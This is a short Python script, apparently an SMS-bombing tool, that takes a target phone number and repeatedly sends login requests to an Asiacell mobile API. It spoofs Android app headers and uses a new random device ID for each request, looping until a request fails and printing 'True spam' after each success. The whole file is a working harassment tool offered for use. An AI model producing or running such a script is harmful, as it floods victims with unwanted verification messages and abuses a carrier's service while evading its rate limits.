import requests
import json, os, uuid
import pyfiglet 
#=====================
R='\033[1;31m'#لون احمر
G='\033[1;32m'#لون اخضر
Y='\033[1;33m'#لون اصفر
B='\033[1;34m'#لون ازرك
M='\033[1;35m'#لون بنفسجي
C='\033[1;36m'#لون سمائي
W='\033[1;37m'#لون ابيض
#=====================
logo =pyfiglet.figlet_format("              M u s a  ")
print(M+logo)
print('~'*60)
print('')
number =input(Y+'Enter phone number : ')
os.system('clear')
#=====================

def spam():
	while True:						
		url = "https://odpapp.asiacell.com/api/v1/login?lang=en"
		
		payload = {
		  "captchaCode": "",
		  "username": number
		}
		
		headers = {
		  'User-Agent': "okhttp/5.1.0",
		  'Connection': "Keep-Alive",
		  'Accept-Encoding': "gzip",
		  'Content-Type': "application/json",
		  'Cache-Control': "no-cache",
		  'DeviceID': str(uuid.uuid4()),
		  'X-OS-Version': "14",
		  'X-Device-Type': "[Android][TECNO][TECNO LH7n 14][TIRAMISU][HMS][4.3.7:90000325]",
		  'X-ODP-APP-VERSION': "4.3.7",
		  'X-FROM-APP': "odp",
		  'X-ODP-CHANNEL': "mobile",
		  'X-SCREEN-TYPE': "false",
		  'Content-Type': "application/json; charset=UTF-8"
		}
		
		response = requests.post(url, data=json.dumps(payload), headers=headers).text		
		if '"success":true'in response:
			print(G+f'True spam ~ {number}')
		else:
			print(R+f'False spam ~ {number}')
			break
spam()			